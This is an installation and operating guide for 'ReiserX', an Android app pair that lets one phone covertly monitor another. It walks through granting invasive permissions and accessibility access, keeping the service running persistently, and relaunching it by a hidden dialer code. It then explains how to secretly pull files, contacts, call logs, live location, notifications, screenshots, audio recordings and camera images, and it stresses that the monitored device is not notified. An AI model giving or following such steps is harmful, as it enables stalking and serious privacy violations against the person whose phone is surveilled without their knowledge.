REISERX INSTALLATION

1. INSTALLATION: REISERX DRIVER

1. Install the application in device A. download here

2. Grant Notification access permission from Settings/Apps/Special access

3. The application will be launched automatically, if not launched dial *8724# to launch it manually

4. Complete the checklist displayed in application

5. Login

6. A QR code with device code will be displayed

Done

1.1. REQUIRED PERMISSION: REISERX DRIVER

1. Call logs - to get access to call logs

2. Contacts - for get access to contacts

3. Files and media (for Android 11+ Give all files access) - to operate all files operations

4. Location (for android 11+ give background location permission) - to trace the device

5. Microphone - to get acess to record audio

6. Draw over other apps/Appear on top - to perfectly launch the application

7. Camera - to get easy access to fetch images

1.2. SPECIAL PERMISSION: REISERX DRIVER

1. Ignore battery optimization - this is to assure that the service is running throughout permanently

2. Notification access - to get easy access to record notification and to restart the service

3. Usage access - to get access to device usage stats (screentime, application screentime, no. of launches per application

1.3. ACCESSIBLITY ACCESS: REISERX DRIVER

1. On launching the app you will be redirected to checklist, from there you have to Start Accessibility service for ReiserX driver, you also have to do this everytime you install an update Accessibility service is used to Record audios, take screenshot, camera capture

2. ReiserX for some devices: Xiaomi/Oppo/Vivo & other phones with cusom UI: you have to manually enable Background data access and Auto restart permission from App info

2. INSTALLATION: REISERX PANEL

1. Install the application in Device B. Install from Google Play

2. Launch the application

3. Create an account for yourself

5. verify your account

6. After successfully logging in you will be moved to the Home Page of the application

7. Grant storage and camera permission

8. Tap on + icon present on the Home page

9. Connect to device A by scanning the QR code or enter device code

You're all set to go, now you can remote access device A and fetch data

2.1. OPERATING GUIDE: REISERX PANEL

ReiserX executes all the operations in background and the device (in which ReiserX driver is installed) will not be notified

1. Click on connected devices list

2. Service info page will be displayed

3. ReiserX driver will only execute operations when its service is active, you can view it on Operations Activity>service active

4. Then you can see network state, screen lock, currently running application, and the version downloaded on device A

5. Then to get access to device A data you have to click on the Operations button

6. Operations list page displays

7. Then first we have DIRECTORIES

8. Click that and you will get access to all device files (WE DO NOT ENCOURAGE DATA BREACHING)

9. Next we have CONTACTS, There you get to all their contacts list

10. Next we have CALL LOGS, you can see all their call logs

11. Next we have LOCATION, With this we can trace the exact location of the device

12. Next we have NOTIFICATION HISTORY, you can receive and read all the notification of the device A

13. Next we have SCREENSHOT, you can take a screenshot from device A (for Android 8,9 the user will be notified for the screenshot)

14. Next we have RECORD AUDIO, you can record the audio of the device by selecting the duration of the recording

15. Next we have CAMERA CAPTURE, you can capture the image from device A camera when you click camera capture then you have a camera icon at the bottom click it then select front view or rear view then the image will be captured and will be uploaded to the system within seconds

16. Next we have CLEAR PREFERENCE, it is file operations caches data, clear it only when you encounter any problems in file operations

17. Next we have LAUNCH SERVICE, ReiserX driver launch services

18. Next we have APP LIST, get the list of all the applications present in device A

19. Next we have USAGE STATS DATA, get screen time, no. of launches of every selected applications

20. Next we have DEVICE INFO, get Device A information

21. To launch ReiserX driver launch it from Operations list>launch services or dial *8724#
